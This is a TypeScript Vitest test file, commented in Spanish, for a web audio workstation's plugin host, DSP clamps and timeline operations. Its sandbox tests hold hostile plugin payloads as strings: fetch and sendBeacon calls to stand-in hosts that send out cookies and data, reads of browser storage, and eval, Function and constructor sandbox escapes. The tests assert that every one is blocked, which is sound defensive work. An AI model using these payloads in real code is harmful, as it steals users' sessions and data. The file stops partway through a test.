// Fix(waveB-ts): noUncheckedIndexedAccess — aserciones non-null (!) en indexaciones
// garantizadas por el setup de cada test; sin cambios de semántica ni comportamiento.
import { describe, it, expect, vi, afterEach, beforeEach } from 'vitest';
import {
  BUILTIN_PLUGINS,
  createReverbImpulse,
  makeDistortionCurve,
  DELAY_FEEDBACK_MAX_GAIN,
  REVERB_DECAY_DEBOUNCE_MS,
  SATURATOR_DRIVE_DEBOUNCE_MS,
} from './builtinPlugins';
import { pluginHost, clampToDef } from './PluginHost';
import { isSandboxAvailable, scanCustomPluginCode, ensureSandboxBackend } from './pluginSandbox';
import { registerCustomPluginForTest } from './pluginTestBridge';
import type { ActiveDSPNode } from './PluginHost';
import { AudioEngine } from './AudioEngine';
import { MasterBus } from './MasterBus';
import { TrackNode } from './TrackNode';
import type { AudioTrack } from '../types/daw';
import { generateDemoTrackBuffer, generateWaveformPeaks, DEMO_TARGET_PEAK } from './waveformUtils';
import {
  splitClipOperation,
  trimLeftOperation,
  calculateMagneticSnap,
  MIN_CLIP_DURATION,
} from './timelineOps';
import type { AudioClip } from '../types/daw';

// ---------------------------------------------------------------------------
// Mocks headless de Web Audio
// ---------------------------------------------------------------------------

class MockParam {
  value: number;
  calls: number[] = [];
  constructor(v = 0) {
    this.value = v;
  }
  setTargetAtTime(target: number): void {
    this.value = target;
    this.calls.push(target);
  }
  cancelScheduledValues(): void {}
}

class MockNode {
  connect(): void {}
  disconnect(): void {}
}

class MockGain extends MockNode {
  gain = new MockParam(1);
}
class MockDelay extends MockNode {
  delayTime = new MockParam(0);
}
class MockFilter extends MockNode {
  type = '';
  frequency = new MockParam(0);
  Q = new MockParam(1);
}
class MockConvolver extends MockNode {
  buffer: unknown = null;
}
class MockShaper extends MockNode {
  curve: Float32Array | null = null;
  oversample: string = 'none';
}
class MockComp extends MockNode {
  threshold = new MockParam(0);
  knee = new MockParam(0);
  ratio = new MockParam(1);
  attack = new MockParam(0);
  release = new MockParam(0);
}

class MockBuffer {
  numberOfChannels: number;
  length: number;
  sampleRate: number;
  duration: number;
  private data: Float32Array[];
  constructor(channels: number, length: number, sampleRate: number, fill?: (i: number) => number) {
    this.numberOfChannels = channels;
    this.length = length;
    this.sampleRate = sampleRate;
    this.duration = length / sampleRate;
    this.data = [];
    for (let c = 0; c < channels; c++) {
      const d = new Float32Array(length);
      for (let i = 0; i < length; i++) d[i] = fill ? fill(i) : 0;
      this.data.push(d);
    }
  }
  getChannelData(c: number): Float32Array {
    return this.data[c]!;
  }
}

function makeMockCtx(sampleRate = 44100) {
  const gains: MockGain[] = [];
  const shapers: MockShaper[] = [];
  const convolvers: MockConvolver[] = [];
  const filters: MockFilter[] = [];
  const delays: MockDelay[] = [];
  const comps: MockComp[] = [];
  const ctx = {
    currentTime: 5.0,
    sampleRate,
    createGain: () => {
      const n = new MockGain();
      gains.push(n);
      return n;
    },
    createDelay: () => {
      const n = new MockDelay();
      delays.push(n);
      return n;
    },
    createBiquadFilter: () => {
      const n = new MockFilter();
      filters.push(n);
      return n;
    },
    createConvolver: () => {
      const n = new MockConvolver();
      convolvers.push(n);
      return n;
    },
    createWaveShaper: () => {
      const n = new MockShaper();
      shapers.push(n);
      return n;
    },
    createDynamicsCompressor: () => {
      const n = new MockComp();
      comps.push(n);
      return n;
    },
    createBuffer: (ch: number, len: number, sr: number) => new MockBuffer(ch, len, sr),
  } as unknown as BaseAudioContext;
  return { ctx, gains, shapers, convolvers, filters, delays, comps };
}

afterEach(() => {
  vi.useRealTimers();
  // Fix(AUD-10): resetea el singleton compartido (patrón de engine_fixes.test.ts)
  // para que los stubs de ensureContext no fuguen al resto del worker.
  const engine = AudioEngine.getInstance();
  try {
    (engine as unknown as { isRecording: boolean }).isRecording = false;
    engine.stop();
  } catch (_) {}
  try {
    engine.clear();
  } catch (_) {}
  engine.setLoop(false, 0, 16);
  engine.setMetronome(false);
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
});

function peakOf(buf: { getChannelData(c: number): Float32Array; length: number; numberOfChannels: number }): number {
  let peak = 0;
  for (let c = 0; c < buf.numberOfChannels; c++) {
    const d = buf.getChannelData(c);
    for (let i = 0; i < buf.length; i++) {
      const a = Math.abs(d[i]!);
      if (a > peak) peak = a;
    }
  }
  return peak;
}

// ---------------------------------------------------------------------------

describe('waveA: seguridad de plugins y operaciones', () => {
  it('delay.feedback con clamp duro <= 0.95 en creación y update', () => {
    expect(DELAY_FEEDBACK_MAX_GAIN).toBeLessThanOrEqual(0.95);
    const { ctx, gains } = makeMockCtx();
    // Creación con valor fuera de rango (>= 100 -> ganancia de loop >= 1 sin clamp)
    const dsp = BUILTIN_PLUGINS.delay!.createDSPNode(ctx, { time: 250, feedback: 150, damp: 6000, mix: 25 });
    const feedbackNode = gains[4]!;
    expect(feedbackNode.gain.value).toBeLessThanOrEqual(0.95);
    // Update con valor abusivo también queda capado
    dsp.updateParameter('feedback', 200);
    expect(feedbackNode.gain.value).toBeLessThanOrEqual(0.95);
  });

  it('PluginHost.createInstanceNode sanitiza feedback abusivo', () => {
    const { ctx, gains } = makeMockCtx();
    const node = pluginHost.createInstanceNode(ctx, {
      instanceId: 'inst_delay',
      pluginId: 'delay',
      name: 'Delay',
      enabled: true,
      parameters: { time: 250, feedback: 200, damp: 6000, mix: 25 },
    });
    expect(node).not.toBeNull();
    expect(gains[4]!.gain.value).toBeLessThanOrEqual(0.95);
    node!.updateParameter('feedback', 500);
    expect(gains[4]!.gain.value).toBeLessThanOrEqual(0.95);
  });

  it('clampToDef por plugin (frecuencias <= 0, ratio < 1, etc.)', () => {
    expect(clampToDef('eq3', 'lowFreq', 0)).toBe(40);
    expect(clampToDef('eq3', 'lowFreq', -100)).toBe(40);
    expect(clampToDef('eq3', 'highFreq', 99999)).toBe(16000);
    expect(clampToDef('compressor', 'ratio', 0.5)).toBe(1);
    expect(clampToDef('delay', 'feedback', 100)).toBe(85);
    expect(clampToDef('reverb', 'decay', 99)).toBe(5.0);
    expect(clampToDef('saturator', 'drive', -5)).toBe(0);
    expect(clampToDef('saturator', 'drive', 500)).toBe(100);
    expect(clampToDef('limiter', 'ceiling', 5)).toBe(0);
    // En rango pasa intacto; NaN cae al default; param desconocido pasa intacto
    expect(clampToDef('eq3', 'lowFreq', 100)).toBe(100);
    expect(clampToDef('eq3', 'lowFreq', NaN)).toBe(100);
    expect(clampToDef('eq3', 'inexistente', 123)).toBe(123);
  });

  // Task 38 (flake): presupuesto explícito. IR multi-MB en CPU síncrono:
  // medía segundos en máquina descargada y tumbaba el timeout de 5 s por
  // defecto de Vitest bajo cualquier contención. 60 s da >10× de margen.
  it('IR de reverb determinista (misma decay -> mismo buffer)', { timeout: 60_000 }, () => {
    const { ctx } = makeMockCtx();
    const a = createReverbImpulse(ctx, 0.5, 2.5) as unknown as MockBuffer;
    const b = createReverbImpulse(ctx, 0.5, 2.5) as unknown as MockBuffer;
    expect(a.getChannelData(0)).toEqual(b.getChannelData(0));
    expect(a.getChannelData(1)).toEqual(b.getChannelData(1));
    // Distinta decay -> distinto contenido
    const c = createReverbImpulse(ctx, 0.5, 3.5) as unknown as MockBuffer;
    expect(c.getChannelData(0)).not.toEqual(a.getChannelData(0));
  });

  it('reverb no regenera IR por tick (debounce trailing)', () => {
    vi.useFakeTimers();
    const { ctx, convolvers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.reverb!.createDSPNode(ctx, { decay: 2.0, mix: 30, damping: 8000 });
    const conv = convolvers[0]!;
    const initial = conv.buffer;
    dsp.updateParameter('decay', 3.0);
    dsp.updateParameter('decay', 3.5);
    dsp.updateParameter('decay', 4.0);
    // Sin regeneración síncrona por tick
    expect(conv.buffer).toBe(initial);
    vi.advanceTimersByTime(REVERB_DECAY_DEBOUNCE_MS + 50);
    expect(conv.buffer).not.toBe(initial);
    dsp.cleanup?.();
  });

  it('saturator: clamp drive 0..100 + debounce de curva', () => {
    vi.useFakeTimers();
    // Creación con drive abusivo equivale a drive 100
    expect(makeDistortionCurve(200 / 2)).toEqual(makeDistortionCurve(100 / 2));
    const { ctx, shapers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.saturator!.createDSPNode(ctx, { drive: 25, tone: 6500, mix: 50 });
    const shaper = shapers[0]!;
    const initialCurve = shaper.curve;
    dsp.updateParameter('drive', 90);
    dsp.updateParameter('drive', 95);
    // Debounce: sin recálculo síncrono por tick
    expect(shaper.curve).toBe(initialCurve);
    vi.advanceTimersByTime(SATURATOR_DRIVE_DEBOUNCE_MS + 50);
    expect(shaper.curve).not.toBe(initialCurve);
    expect(shaper.curve).toEqual(makeDistortionCurve(95 / 2));
    dsp.cleanup?.();
  });

  it('saturator: rampa de wet durante el swap de curva', () => {
    vi.useFakeTimers();
    const { ctx, gains, shapers } = makeMockCtx();
    const dsp = BUILTIN_PLUGINS.saturator!.createDSPNode(ctx, { drive: 25, tone: 6500, mix: 50 });
    const wetGain = gains[3]!;
    wetGain.gain.calls = [];
    dsp.updateParameter('drive', 80);
    vi.advanceTimersByTime(SATURATOR_DRIVE_DEBOUNCE_MS + 50);
    // La rampa lleva wet a 0 durante el swap y lo restaura al mix (0.5)
    expect(wetGain.gain.calls).toContain(0);
    expect(shapers[0]!.curve).toEqual(makeDistortionCurve(80 / 2));
    expect(wetGain.gain.calls[wetGain.gain.calls.length - 1]!).toBeCloseTo(0.5, 5);
    dsp.cleanup?.();
  });

  // Task 38 (flake): presupuesto explícito. 8 buffers demo generados en CPU
  // síncrono (medido hasta ~4.6 s descargado, 92% del timeout por defecto):
  // 60 s da >12× de margen bajo contención.
  it('demo determinista + pico final <= ~0.89', { timeout: 60_000 }, () => {
    const { ctx } = makeMockCtx();
    const kinds = ['drums', 'bass', 'chords', 'lead'] as const;
    for (const kind of kinds) {
      const a = generateDemoTrackBuffer(ctx, kind, 2, 120) as unknown as MockBuffer;
      const b = generateDemoTrackBuffer(ctx, kind, 2, 120) as unknown as MockBuffer;
      expect(a.getChannelData(0)).toEqual(b.getChannelData(0));
      expect(a.getChannelData(1)).toEqual(b.getChannelData(1));
      expect(peakOf(a)).toBeLessThanOrEqual(DEMO_TARGET_PEAK + 1e-6);
    }
  });

  it('picos en clip corto no-ceros + resto parcial final', () => {
    // Clip corto: length < targetPoints (antes devolvía ceros)
    const shortBuf = new MockBuffer(2, 100, 44100, (i) => Math.sin((2 * Math.PI * 440 * i) / 44100) * 0.5);
    const peaks = generateWaveformPeaks(shortBuf as unknown as AudioBuffer, 800);
    expect(peaks.length).toBe(1600);
    let maxAbs = 0;
    for (let i = 0; i < peaks.length; i++) maxAbs = Math.max(maxAbs, Math.abs(peaks[i]!));
    expect(maxAbs).toBeGreaterThan(0.1);
    // Resto parcial: length 100, 30 puntos -> blockSize 3, último bin cubre [87, 100)
    const tail = new MockBuffer(1, 100, 44100, () => 0.05);
    (tail.getChannelData(0) as Float32Array)[99] = 0.9;
    const tailPeaks = generateWaveformPeaks(tail as unknown as AudioBuffer, 30);
    expect(tailPeaks[29 * 2 + 1]).toBeCloseTo(0.9, 5);
  });

  it('split capa secondDuration al buffer (o null si resto < min)', () => {
    const mkClip = (duration: number, bufferDuration: number | null): AudioClip => ({
      id: 'c1',
      trackId: 't1',
      name: 'clip',
      startTime: 0,
      duration,
      offset: 0,
      audioBuffer: bufferDuration === null ? null : ({ duration: bufferDuration } as unknown as AudioBuffer),
      peaks: new Float32Array(0),
    });
    // Overflow: el clip declara 8s pero la fuente solo tiene 5s
    const res = splitClipOperation(mkClip(8, 5), 3.0);
    expect(res).not.toBeNull();
    expect(res!.clip2.duration).toBeCloseTo(2.0, 5);
    expect(res!.clip2.offset).toBeCloseTo(3.0, 5);
    // Resto insuficiente -> null
    expect(splitClipOperation(mkClip(8, 3.1), 3.0)).toBeNull();
    // Sin buffer no se capa
    const noBuf = splitClipOperation(mkClip(8, null), 3.0);
    expect(noBuf!.clip2.duration).toBeCloseTo(5.0, 5);
  });

  it('trimLeft con overflow respeta max(-startTime, -offset)', () => {
    const clip: AudioClip = {
      id: 'c1',
      trackId: 't1',
      name: 'clip',
      startTime: 1.0,
      duration: 5.0,
      offset: 0.5,
      audioBuffer: null,
      peaks: new Float32Array(0),
    };
    // Extender a la izquierda más allá del offset queda capado a -0.5
    const ext = trimLeftOperation(clip, -1.0);
    expect(ext.startTime).toBeCloseTo(0.5, 5);
    expect(ext.offset).toBeCloseTo(0.0, 5);
    expect(ext.duration).toBeCloseTo(5.5, 5);
    // Acortar más allá del mínimo satura a minDuration
    const short = trimLeftOperation(clip, 100);
    expect(short.duration).toBeCloseTo(MIN_CLIP_DURATION, 5);
  });

  it('snap en 6/8 usa el denominador del compás', () => {
    // En 6/8 a 120bpm: sixteenth = 0.5 * (4/8) / 4 = 0.0625
    const snap68 = calculateMagneticSnap(0.07, 120, [6, 8], [], 0.1);
    expect(snap68.isSnapped).toBe(true);
    expect(snap68.snappedTime).toBeCloseTo(0.0625, 4);
    // El mismo instante en 4/4 cae en otra línea (0.125), no en 0.0625
    const snap44 = calculateMagneticSnap(0.07, 120, [4, 4], [], 0.1);
    expect(snap44.isSnapped).toBe(true);
    expect(snap44.snappedTime).toBeCloseTo(0.125, 4);
  });

  it('snap cubre la ventana por umbral (no ±2 fijos)', () => {
    // Umbral amplio: debe alcanzar líneas lejanas al índice redondeado
    const snap = calculateMagneticSnap(1.0, 120, [4, 4], [], 0.6);
    expect(snap.isSnapped).toBe(true);
    // La mejor candidata dentro de la ventana es el propio 1.0
    expect(snap.snappedTime).toBeCloseTo(1.0, 4);
    // Fuera de ventana no hay snap
    const far = calculateMagneticSnap(0.30, 120, [4, 4], [], 0.02);
    expect(far.isSnapped).toBe(false);
  });

// ---------------------------------------------------------------------------
// SEC-01 / AUD-08: el sandbox de plugins rechaza la exfiltración (SB1-SB7)
// Ronda fix 1: el código de usuario SOLO se evalúa en el iframe opaco. Estos
// tests verifican la puerta de entrada real (`registerCustomPluginSecure`):
// en node no hay contenedor, así que todo payload hostil debe caer en el
// escáner ANTES de cualquier ejecución. Los stubs (fetch, sonda) delatan
// cualquier ejecución.
// ---------------------------------------------------------------------------

const SB_LEGIT_CODE = `
  const customPlugin = {
    id: 'sb_legit',
    name: 'Legítimo',
    category: 'utility',
    description: 'plugin de prueba sin APIs peligrosas',
    parameters: [],
    createDSPNode: (ctx) => {
      const g = ctx.createGain();
      return { inputNode: g, outputNode: g, updateParameter: () => {} };
    }
  };
`;

/** La vía real rechaza sin ejecutar (en node, el escáner dispara primero). */
async function expectSecurelyBlocked(code: string): Promise<void> {
  await expect(pluginHost.registerCustomPluginSecure(code)).rejects.toThrow(
    /bloqueado por seguridad/
  );
}

describe('SEC-01: el sandbox de plugins rechaza la exfiltración (SB1-SB7)', () => {
  it('SB1: globalThis.fetch se rechaza y no deja rastro en globalThis', async () => {
    await expectSecurelyBlocked(`
        globalThis.fetch('https://malicioso.example/fuga');
        const customPlugin = { id: 'sb1', name: 'SB1', parameters: [], createDSPNode: () => ({}) };
      `);
    await expectSecurelyBlocked(`
        globalThis.__pwned = 1;
        const customPlugin = { id: 'sb1b', name: 'SB1b', parameters: [], createDSPNode: () => ({}) };
      `);
    expect((globalThis as unknown as Record<string, unknown>).__pwned).toBeUndefined();
  });

  it('SB2: navigator.sendBeacon se rechaza', async () => {
    await expectSecurelyBlocked(`
        navigator.sendBeacon('https://malicioso.example/fuga', 'datos');
        const customPlugin = { id: 'sb2', name: 'SB2', parameters: [], createDSPNode: () => ({}) };
      `);
  });

  it('SB3: location.href se rechaza', async () => {
    await expectSecurelyBlocked(`
        const destino = location.href;
        const customPlugin = { id: 'sb3', name: 'SB3', parameters: [], createDSPNode: () => ({}) };
      `);
  });

  it('SB4: x.constructor.constructor("...") se rechaza', async () => {
    await expectSecurelyBlocked(`
        const x = {};
        const f = x.constructor.constructor("return 42");
        const customPlugin = { id: 'sb4', name: 'SB4', parameters: [], createDSPNode: () => ({}) };
      `);
  });

  it('SB5: self["fe"+"tch"] (concatenación) se rechaza', async () => {
    await expectSecurelyBlocked(`
        const robar = self['fe' + 'tch'];
        const customPlugin = { id: 'sb5', name: 'SB5', parameters: [], createDSPNode: () => ({}) };
      `);
  });

  it('SB6: un plugin legítimo sí se acepta (puente de test)', async () => {
    const def = await registerCustomPluginForTest(SB_LEGIT_CODE);
    expect(def.id).toBe('sb_legit');
    expect(typeof def.createDSPNode).toBe('function');
  });

  it('SB7: el código no puede leer el almacenamiento del padre (caches/cookieStore/localStorage/indexedDB)', async () => {
    const seen: string[] = [];
    vi.stubGlobal('caches', {
      open: (name: string) => {
        seen.push(`caches.open:${name}`);
        return Promise.resolve(null);
      },
    });
    vi.stubGlobal('cookieStore', {
      get: (name: string) => {
        seen.push(`cookieStore.get:${name}`);
        return Promise.resolve(null);
      },
    });
    vi.stubGlobal('localStorage', {
      getItem: (key: string) => {
        seen.push(`localStorage:${key}`);
        return 'SECRETO';
      },
    });
    vi.stubGlobal('indexedDB', {
      open: (name: string) => {
        seen.push(`indexedDB.open:${name}`);
        return null;
      },
    });
    try {
      await expectSecurelyBlocked(`
          caches.open('hydradaw-proyectos');
          const customPlugin = { id: 'sb7a', name: 'SB7a', parameters: [], createDSPNode: () => ({}) };
        `);
      await expectSecurelyBlocked(`
          cookieStore.get('sesion');
          const customPlugin = { id: 'sb7b', name: 'SB7b', parameters: [], createDSPNode: () => ({}) };
        `);
      await expectSecurelyBlocked(`
          const robado = localStorage.getItem('proyecto');
          const customPlugin = { id: 'sb7c', name: 'SB7c', parameters: [], createDSPNode: () => ({}) };
        `);
      await expectSecurelyBlocked(`
          const db = indexedDB.open('hydradaw');
          const customPlugin = { id: 'sb7d', name: 'SB7d', parameters: [], createDSPNode: () => ({}) };
        `);
      expect(seen).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
    }
  });

  it('SB7b: el acceso diferido dentro de createDSPNode también se rechaza en el registro', async () => {
    await expectSecurelyBlocked(`
        const customPlugin = {
          id: 'sb7_deferred',
          name: 'Diferido',
          category: 'utility',
          description: 'intenta leer el almacenamiento al instanciar',
          parameters: [],
          createDSPNode: (ctx) => {
            const g = ctx.createGain();
            caches.open('hydradaw-proyectos');
            return { inputNode: g, outputNode: g, updateParameter: () => {} };
          }
        };
      `);
  });

  it('SB-Proto: el escáner acepta lo legítimo y rechaza lo hostil', () => {
    expect(scanCustomPluginCode(SB_LEGIT_CODE)).toBeNull();
    expect(
      scanCustomPluginCode(
        `globalThis.fetch('https://malicioso.example/x');\nconst customPlugin = { id: 'z', createDSPNode: () => ({}) };`
      )
    ).toMatch(/bloqueado|globalThis|restringido/);
  });

  it('SB-Proto: sin DOM no hay sandbox y la vía aislada rechaza sin ejecutar nada', async () => {
    expect(isSandboxAvailable()).toBe(false);
    expect(() => ensureSandboxBackend()).toThrow(/sandbox/i);
    const seen: string[] = [];
    vi.stubGlobal('fetch', () => {
      seen.push('fetch');
      return Promise.resolve(null);
    });
    try {
      // Hasta el código legítimo se rechaza sin sandbox: nunca sin protección.
      await expect(pluginHost.registerCustomPluginSecure(SB_LEGIT_CODE)).rejects.toThrow(
        /sandbox/i
      );
      expect(seen).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
    }
  });
});

// ---------------------------------------------------------------------------
// Ronda fix 1 (revisión WP10): el escáner debe rechazar las PALABRAS eval y
// Function (no solo las llamadas `eval(`/`Function(`) y `this` (acceso al
// global vía `this['constr'+'uctor']` en ámbito no estricto). Cada payload
// debe ser RECHAZADO y NO EJECUTADO: la sonda `__sbxProbe` (global stubbed,
// restaurada en el afterEach) delata cualquier ejecución.
// ---------------------------------------------------------------------------

const SB_VALID_TAIL = `
  const customPlugin = {
    id: 'sb_valid_tail',
    name: 'Cola válida',
    category: 'utility',
    description: 'definición válida tras el payload',
    parameters: [],
    createDSPNode: (ctx) => {
      const g = ctx.createGain();
      return { inputNode: g, outputNode: g, updateParameter: () => {} };
    }
  };
`;

describe('SEC-01r: el escáner rechaza alias y accesos dinámicos (ronda fix 1)', () => {
  beforeEach(() => {
    vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
  });

  function probeTouched(): string[] {
    return (globalThis as unknown as { __sbxProbe: { touched: string[] } }).__sbxProbe.touched;
  }

  it('SB-X1: `const e = eval; e(payload)` se rechaza por la palabra eval', async () => {
    expect(scanCustomPluginCode(`const e = eval;\n${SB_VALID_TAIL}`)).toMatch(/eval/);
    await expectSecurelyBlocked(
      `const e = eval;\ne("__sbxProbe.touched.push('X1')");\n${SB_VALID_TAIL}`
    );
    expect(probeTouched()).toEqual([]);
  });

  it('SB-X2: `const f = Function; f("...")()` se rechaza por la palabra Function', async () => {
    expect(scanCustomPluginCode(`const f = Function;\n${SB_VALID_TAIL}`)).toMatch(/Function/);
    await expectSecurelyBlocked(
      `const f = Function;\nf("__sbxProbe.touched.push('X2'); return 1")();\n${SB_VALID_TAIL}`
    );
    expect(probeTouched()).toEqual([]);
  });

  it("SB-X3: `globalThis['fet'+'ch']` se rechaza y fetch no se llama", async () => {
    const calls: string[] = [];
    vi.stubGlobal('fetch', (...args: unknown[]) => {
      calls.push(String(args[0]));
      return Promise.resolve(null);
    });
    try {
      await expectSecurelyBlocked(
        `globalThis['fet' + 'ch']('https://malicioso.example/fuga');\n${SB_VALID_TAIL}`
      );
      expect(calls).toEqual([]);
      expect(probeTouched()).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
      vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
    }
  });

  it("SB-X4: `navigator['sendBeac'+'on']` se rechaza y no se llama", async () => {
    const calls: unknown[][] = [];
    vi.stubGlobal('navigator', {
      sendBeacon: (...args: unknown[]) => {
        calls.push(args);
        return true;
      },
    });
    try {
      await expectSecurelyBlocked(
        `navigator['sendBeac' + 'on']('https://malicioso.example/fuga', 'd');\n${SB_VALID_TAIL}`
      );
      expect(calls).toEqual([]);
      expect(probeTouched()).toEqual([]);
    } finally {
      vi.unstubAllGlobals();
      vi.stubGlobal('__sbxProbe', { touched: [] as string[] });
    }
  });

  it("SB-X5: `location['href']` se rechaza", async () => {
    expect(scanCustomPluginCode(`const u = location['href'];\n${SB_VALID_TAIL}`)).toMatch(/location/);
    await expectSecurelyBlocked(`const u = location['href'];\n${SB_VALID_TAIL}`);
    expect(probeTouched()).toEqual([]);
  });

  it("SB-X6: `this['constr'+'uctor']` se rechaza por la palabra this", async () => {
    expect(scanCustomPluginCode(`const c = this['constr' + 'uctor'];\n${SB_VALID_TAIL}`)).toMatch(
      /this/
    );
    await expectSecurelyBlocked(
      `const c = this['constr' + 'uctor'];\n__sbxProbe.touched.push('X6');\n${SB_VALID_TAIL}`
    );
    expect(probeTouched()).toEqual([]);
  });

  it('SB-X7: alcanzar `window.parent` se rechaza y no deja rastro', async () => {
    await expectSecurelyBlocked(
      `const p = window.parent;\n__sbxProbe.touched.push('X7');\n${SB_VALID_TAIL}`
    );
    expect(probeTouched()).toEqual([]);
  });
});

  it('la vía segura bloquea scripts con acceso a APIs peligrosas (fetch/DOM/Storage)', async () => {
    await expectSecurelyBlocked(`
        fetch('https://malicious.site/leak?c=' + document.cookie);
        const customPlugin = { id: 'bad', name: 'Bad', createDSPNode: () => {} };
      `);

    await expectSecurelyBlocked(`
        window.localStorage.setItem('compromised', 'true');
        const customPlugin = { id: 'bad2', name: 'Bad 2', createDSPNode: () => {} };
      `);
  });

  it('la vía puente admite plugins válidos y seguros', async () => {
    const valid = await registerCustomPluginForTest(`
      const customPlugin = {
        id: 'clean_gain',
        name: 'Clean Gain',
        version: '1.0.0',
        parameters: [],
        createDSPNode: (ctx) => {
          const g = ctx.createGain();
          return {
            instanceId: 'i1',
            pluginId: 'clean_gain',
            inputNode: g,
            outputNode: g,
            updateParameter: () => {},
          };
        }
      };
    `);
    expect(valid.id).toBe('clean_gain');
  });
});

// ---------------------------------------------------------------------------
// AUD-10: un plugin roto no rompe el transporte
// ---------------------------------------------------------------------------

class T10AudioParam {
  value: number;
  constructor(defaultValue: number = 0) {
    this.value = defaultValue;
  }
  setTargetAtTime(target: number): void {
    this.value = target;
  }
  setValueAtTime(v: number): void {
    this.value = v;
  }
  linearRampToValueAtTime(): void {}
  exponentialRampToValueAtTime(): void {}
}

class T10AudioNode {
  connectedTo: T10AudioNode[] = [];
  disconnected = false;
  connect(destination: T10AudioNode): T10AudioNode {
    // Simula el InvalidAccessError real al cablear un nodo ajeno/neutralizado.
    if ((destination as unknown as { __boomPlug?: boolean })?.__boomPlug) {
      throw new Error('connect roto (nodo ajeno)');
    }
    this.connectedTo.push(destination);
    this.disconnected = false;
    return destination;
  }
  disconnect(): void {
    this.connectedTo = [];
    this.disconnected = true;
  }
}

class T10GainNode extends T10AudioNode {
  gain = new T10AudioParam(1.0);
}

class T10BufferSourceNode extends T10AudioNode {
  buffer: AudioBuffer | null = null;
  onended: (() => void) | null = null;
  startCalls: Array<{ when: number; offset: number; dur: number }> = [];
  start(when?: number, offset?: number, dur?: number): void {
    this.startCalls.push({ when: when ?? 0, offset: offset ?? 0, dur: dur ?? 0 });
  }
  stop(): void {}
}

class T10BaseContext {
  currentTime = 100.0;
  sampleRate = 44100;
  destination = new T10AudioNode();
  sources: T10BufferSourceNode[] = [];
  gains: T10GainNode[] = [];
  createGain(): T10GainNode {
    const g = new T10GainNode();
    this.gains.push(g);
    return g;
  }
  createBufferSource(): T10BufferSourceNode {
    const s = new T10BufferSourceNode();
    this.sources.push(s);
    return s;
  }
  createDynamicsCompressor(): T10AudioNode & Record<string, T10AudioParam> {
    const n = new T10AudioNode() as T10AudioNode & Record<string, T10AudioParam>;
    n.threshold = new T10AudioParam(-24);
    n.knee = new T10AudioParam(30);
    n.ratio = new T10AudioParam(12);
    n.attack = new T10AudioParam(0.003);
    n.release = new T10AudioParam(0.25);
    return n;
  }
  createStereoPanner(): T10AudioNode & { pan: T10AudioParam } {
    const n = new T10AudioNode() as T10AudioNode & { pan: T10AudioParam };
    n.pan = new T10AudioParam(0);
    // Marca el panner para el test M3 (salida que rompe solo hacia el panner).
    (n as unknown as { __isPanner?: boolean }).__isPanner = true;
    return n;
  }
  createAnalyser(): T10AudioNode & { fftSize: number; smoothingTimeConstant: number; getFloatTimeDomainData: (a: Float32Array) => void } {
    const n = new T10AudioNode() as T10AudioNode & {
      fftSize: number;
      smoothingTimeConstant: number;
      getFloatTimeDomainData: (a: Float32Array) => void;
    };
    n.fftSize = 256;
    n.smoothingTimeConstant = 0.8;
    n.getFloatTimeDomainData = (a: Float32Array) => a.fill(0.1);
    return n;
  }
}

function makeT10Track(id: string, overrides: Partial<AudioTrack> = {}): AudioTrack {
  return {
    id,
    name: `Pista ${id}`,
    type: 'audio',
    color: '#06b6d4',
    volume: 1.0,
    pan: 0,
    mute: false,
    solo: false,
    armed: false,
    plugins: [],
    ...overrides,
  };
}

function makeT10Clip(trackId: string, id = `clip_${trackId}`): AudioClip {
  return {
    id,
    trackId,
    name: `Clip ${trackId}`,
    startTime: 0,
    duration: 4,
    offset: 0,
    audioBuffer: { duration: 4 } as unknown as AudioBuffer,
    peaks: new Float32Array([0, 0]),
    color: '#06b6d4',
  };
}

function setupT10Engine() {
  const engine = AudioEngine.getInstance();
  const mockCtx = new T10BaseContext();
  (engine as unknown as { context: unknown }).context = mockCtx;
  (engine as unknown as { masterBus: unknown }).masterBus = new MasterBus(
    mockCtx as unknown as BaseAudioContext
  );
  vi.spyOn(engine, 'ensureContext').mockResolvedValue(mockCtx as unknown as AudioContext);
  (engine as unknown as { trackNodes: Map<string, unknown> }).trackNodes.clear();
  (engine as unknown as { trackEffectsSig?: Map<string, string> }).trackEffectsSig?.clear();
  (engine as unknown as { isPlaying: boolean }).isPlaying = false;
  (engine as unknown as { isRecording: boolean }).isRecording = false;
  (engine as unknown as { lastTake: unknown }).lastTake = null;
  (engine as unknown as { activeLoop: unknown }).activeLoop = null;
  return { engine, mockCtx };
}

describe('AUD-10: un plugin roto no rompe el transporte', () => {
  it('createInstanceNode degrada a pass-through si el nodo no tiene forma válida', () => {
    // Ronda fix 1: definición de primera parte (objeto vivo, no código de
    // usuario) para probar la degradación del transporte.
    pluginHost.registerPluginDefinition({
      id: 'aud10_shape',
      name: 'Forma Rota',
      category: 'utility',
      description: 'devuelve un objeto sin nodos',
      parameters: [],
      createDSPNode: () => ({}),
    });
    // Fix(M2/I3): el mock arranca en 0 para que solo un pass-through con
    // ganancia unidad explícita pase la aserción (el código pre-fix no la fijaba).
    const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
    const node = pluginHost.createInstanceNode(simpleCtx as unknown as BaseAudioContext, {
      instanceId: 'i_shape',
      pluginId: 'aud10_shape',
      name: 'Forma Rota',
      enabled: true,
      parameters: {},
    });
    expect(node).not.toBeNull();
    expect(typeof (node!.inputNode as unknown as { connect?: unknown }).connect).toBe('function');
    expect(node!.outputNode).toBeDefined();
    // El degradado es un pass-through de verdad: ganancia unidad y update noop.
    expect((node!.inputNode as unknown as { gain: { value: number } }).gain.value).toBe(1);
    expect(() => node!.updateParameter('cualquiera', 42)).not.toThrow();
  });

  it('createInstanceNode degrada a pass-through si createDSPNode lanza', () => {
    pluginHost.registerPluginDefinition({
      id: 'aud10_throw',
      name: 'Lanza Siempre',
      category: 'utility',
      description: 'lanza al instanciar',
      parameters: [],
      createDSPNode: () => {
        throw new Error('boom aud10');
      },
    });
    const simpleCtx = { createGain: () => ({ connect(): void {}, disconnect(): void {}, gain: { value: 0 } }) };
    const node = pluginHost.createInstanceNode(simpleCtx as unknown as BaseAudioContext, {
      instanceId: 'i_throw',
      pluginId: 'aud10_throw',
      name: 'Lanza Siempre',
      enabled: true,
      parameters: {},
    });
    expect(node).not.toBeNull();
